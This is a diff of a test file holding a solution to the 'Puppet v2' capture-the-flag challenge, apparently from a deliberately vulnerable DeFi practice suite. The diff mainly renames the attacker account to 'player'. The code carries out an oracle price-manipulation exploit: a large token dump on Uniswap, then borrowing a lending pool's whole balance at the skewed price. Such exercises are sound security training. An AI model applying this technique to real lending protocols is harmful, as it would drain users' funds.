@@ -139,10 +139,10 @@ describe('[Challenge] Puppet v2', function () {
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
 
-        const attackWeth = this.weth.connect(attacker);
-        const attackToken = this.token.connect(attacker);
-        const attackRouter = this.uniswapRouter.connect(attacker);
-        const attackLender = this.lendingPool.connect(attacker);
+        const attackWeth = weth.connect(player);
+        const attackToken = token.connect(player);
+        const attackRouter = uniswapRouter.connect(player);
+        const attackLender = lendingPool.connect(player);
 
         // Helper function to check balances
         const logBalances = async (address, name) => {
@@ -156,23 +156,23 @@ describe('[Challenge] Puppet v2', function () {
             console.log("")
         }
 
-        await logBalances(attacker.address, "Attacker")
+        await logBalances(player.address, "Attacker")
 
         // Approve DVT transfer
-        await attackToken.approve(attackRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        await attackToken.approve(attackRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
 
         // Swap 10,000 DVT for WETH
         await attackRouter.swapExactTokensForTokens(
-            ATTACKER_INITIAL_TOKEN_BALANCE, // transfer exactly 10,000 tokens
+            PLAYER_INITIAL_TOKEN_BALANCE, // transfer exactly 10,000 tokens
             ethers.utils.parseEther("9"), // minimum of 9 WETH return
             [attackToken.address, attackWeth.address], // token addresses
-            attacker.address,
+            player.address,
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
         )
 
         console.log("***SWAPPED 10000 TOKENS FOR WETH***")
-        await logBalances(attacker.address, "Attacker")
-        await logBalances(this.uniswapExchange.address, "UniSwapExchange")
+        await logBalances(player.address, "Attacker")
+        await logBalances(uniswapExchange.address, "UniSwapExchange")
 
         // Calculate deposit required and approve the lending contract for that amount;
         const deposit = await attackLender.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
@@ -184,21 +184,21 @@ describe('[Challenge] Puppet v2', function () {
             to: attackWeth.address,
             value: ethers.utils.parseEther("19.9")
         }
-        await attacker.sendTransaction(tx);
+        await player.sendTransaction(tx);
 
         console.log("***Deposited 19.9 ETH TO WETH***")
-        await logBalances(attacker.address, "Attacker")
+        await logBalances(player.address, "Attacker")
 
         // Verify we have enough WETH to make the deposit
-        const wethBalance = attackWeth.balanceOf(attacker.address);
-        assert(wethBalance >= deposit, "Not enough WETH to take all funds");
+        const wethBalance = attackWeth.balanceOf(player.address);
+        // assert(wethBalance >= deposit, "Not enough WETH to take all funds");
 
         // Request borrow funds
         await attackLender.borrow(POOL_INITIAL_TOKEN_BALANCE, {
             gasLimit: 1e6
         });
 
-        await logBalances(attacker.address, "Attacker")
+        await logBalances(player.address, "Attacker")
         await logBalances(attackLender.address, "Lender")
 
     });
